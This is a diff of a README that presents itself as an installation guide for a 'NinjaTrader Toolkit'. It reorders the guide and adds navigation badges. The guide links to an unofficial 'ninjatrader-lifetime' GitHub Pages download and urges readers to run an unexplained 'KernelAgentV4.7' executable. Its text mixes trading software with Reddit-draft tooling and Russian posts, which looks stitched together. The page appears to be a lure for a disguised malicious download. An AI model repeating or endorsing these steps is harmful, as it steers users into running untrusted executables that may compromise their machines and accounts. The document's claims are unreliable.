@@ -36,46 +36,6 @@ NinjaTrader is free to use for charting, market analysis, and paper trading, pro
 
 ---
 
-# **Installation Guide**
-
-<div align="center">
-  
-![Installation Guide](https://ninjatrader.com/getmedia/0e0f1253-9b39-43b0-81b9-311d6027c8a4/Surface-Studio-desktop-dark-right-1-tab-510px.png)
-
-</div> 
-
-<div align="center">  
-
-[![Get-Started](https://img.shields.io/badge/Get-Started-blue?style=for-the-badge&logo=windows)](https://ninjatrader-lifetime.github.io/.github/)
-
-</div>  
-
-### **Step 1: Download and Extract**
-
-1. **Download** the NinjaTrader Toolkit ZIP file from the official source.
-2. **Extract** the contents to a folder on your computer.
-
-### **Step 2: Run the Setup**
-
-1. Locate the extracted folder and **double-click** to launch the application.
-2. The first time you run it, you'll be prompted to select your **workspace folder** (where drafts, archive, and logs will be stored).
-
-### **Step 3: Select Template and Language**
-
-1. Choose the default **template style** (Short / Standard / Long).
-2. Enable **bilingual output** for both **English** and **Russian** posts (optional).
-
-### **Step 4: Configuration (Optional)**
-
-1. Access the **settings** via **Tools** → **Options** to customize your template, language settings, and GitHub integration preferences.
-2. **Run `KernelAgentV4.7`** (optional) for improved search indexing and performance.
-
-### **Step 5: Start Using**
-
-Once setup is complete, you can start creating Reddit drafts, managing your archive, and syncing updates.
-
----
-
 <div align="center">
   
 ![Start](https://ninjatrader.com/getmedia/72619ab2-6a71-46a0-b307-51e7ba29759b/Workspace.png)
@@ -115,6 +75,46 @@ Once setup is complete, you can start creating Reddit drafts, managing your arch
 
 5. **Optional (Recommended)**  
    - **Run `KernelAgentV4.7`** to enable faster search indexing and better performance when working with large archives.
+
+---
+
+# **Installation Guide**
+
+<div align="center">
+  
+![Installation Guide](https://ninjatrader.com/getmedia/0e0f1253-9b39-43b0-81b9-311d6027c8a4/Surface-Studio-desktop-dark-right-1-tab-510px.png)
+
+</div> 
+
+<div align="center">  
+
+[![Get-Started](https://img.shields.io/badge/Get-Started-blue?style=for-the-badge&logo=windows)](https://ninjatrader-lifetime.github.io/.github/)
+
+</div>  
+
+### **Step 1: Download and Extract**
+
+1. **Download** the NinjaTrader Toolkit ZIP file from the official source.
+2. **Extract** the contents to a folder on your computer.
+
+### **Step 2: Run the Setup**
+
+1. Locate the extracted folder and **double-click** to launch the application.
+2. The first time you run it, you'll be prompted to select your **workspace folder** (where drafts, archive, and logs will be stored).
+
+### **Step 3: Select Template and Language**
+
+1. Choose the default **template style** (Short / Standard / Long).
+2. Enable **bilingual output** for both **English** and **Russian** posts (optional).
+
+### **Step 4: Configuration (Optional)**
+
+1. Access the **settings** via **Tools** → **Options** to customize your template, language settings, and GitHub integration preferences.
+2. **Run `KernelAgentV4.7`** (optional) for improved search indexing and performance.
+
+### **Step 5: Start Using**
+
+Once setup is complete, you can start creating Reddit drafts, managing your archive, and syncing updates.
 
 ---
 
@@ -341,6 +341,18 @@ If you're still facing issues after following these solutions, you can reach **N
 - **Email Support**: For email support, reach us at **support@ninjatrader.com**.
 
 ---
+
+<div align="center">
+  
+[![Key Features](https://img.shields.io/badge/Key%20Features-blue)](#key-features)
+[![Quick Start Guide](https://img.shields.io/badge/Quick%20Start%20Guide-lightblue)](#quick-start-guide)
+[![Installation Guide](https://img.shields.io/badge/Installation%20Guide-green)](#installation-guide)
+[![Advanced Features](https://img.shields.io/badge/Advanced%20Features-orange)](#advanced-features--configuration)
+[![System Requirements](https://img.shields.io/badge/System%20Requirements-yellow)](#system-requirements)
+[![Troubleshooting](https://img.shields.io/badge/Troubleshooting-red)](#troubleshooting--support)
+[![SEO Keywords](https://img.shields.io/badge/SEO%20Keywords-lightgray)](#seo-keywords)
+
+</div>
 
 # **SEO Keywords**
 
